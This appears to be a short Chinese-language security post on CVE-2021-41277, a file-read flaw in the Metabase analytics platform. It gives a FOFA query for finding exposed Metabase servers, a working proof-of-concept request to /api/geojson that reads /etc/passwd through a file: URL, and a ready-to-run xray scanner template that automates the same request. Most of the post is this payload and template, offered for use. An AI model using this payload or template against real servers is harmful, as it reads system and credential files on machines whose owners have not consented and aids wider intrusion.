## 漏洞简介

Metabase是美国Metabase公司的一个开源数据分析平台。

Metabase 中存在信息泄露漏洞，该漏洞源于产品的 admin-＞settings-＞maps-＞custom maps-＞add a map
操作缺少权限验证。攻击者可通过该漏洞获得敏感信息。

  * CNNVD编号：CNNVD-202111-1565
  * 危害等级：超危

  * CVE编号：CVE-2021-41277

## FOFA搜索app="Metabase"

![1638368458_61a784caca723cd920fdd.png!small?1638368454067](https://image.3001.net/images/20211201/1638368458_61a784caca723cd920fdd.png!small?1638368454067)

## POC

> {{BaseURL}}/api/geojson?url=file:/etc/passwd

例：

![1638368731_61a785db80d8f5a084b9d.png!small?1638368726738](https://image.3001.net/images/20211201/1638368731_61a785db80d8f5a084b9d.png!small?1638368726738)

返回码：200

## xrayPOC

    
    
    name: poc-yaml-Metabase-FileInclusio-com
    rules:
      - method: GET
        path: '/api/geojson?url=file:/etc/passwd'
        headers:
          User-Agent: >-            Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64;
            Trident/5.0)
        follow_redirects: true
        expression: |
          response.status==200

